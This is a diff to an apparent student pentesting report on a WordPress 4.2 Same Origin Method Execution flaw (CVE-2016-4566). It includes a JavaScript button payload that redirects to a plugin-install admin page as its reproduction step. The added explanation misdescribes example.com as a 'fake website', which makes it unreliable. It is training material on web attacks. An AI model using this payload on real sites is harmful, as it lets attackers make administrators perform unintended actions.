@@ -7,7 +7,7 @@ Time spent: 5 hours spent in total
 
 ## Pentesting Report
 
-Exploit 1. Upload Same Origin Method Execution (SOME)
+Exploit 1. CVE-2016-4566 Upload Same Origin Method Execution (SOME)
   - [ ] Summary: 
     - Vulnerability types: Same Origin Method Execution (SOME)
     - Tested in version: 4.2
@@ -15,7 +15,7 @@ Exploit 1. Upload Same Origin Method Execution (SOME)
   - [ ] GIF Walkthrough: https://github.com/oleksandrbi/CodePathweek7/blob/master/exploit1.gif
   - [ ] Steps to recreate: 
         1. Reply to an existing comment
-        2. Using Javascript
+        2. Using Javascript use the following code:
             <button onclick="fire()">Click</button>
             <script>
             function fire() {
@@ -23,6 +23,7 @@ Exploit 1. Upload Same Origin Method Execution (SOME)
               setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
             }
             </script>
+        3. The following script will use an exploit that will create a malicious button that when clicked will take the user to a fake    website example.com
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
     
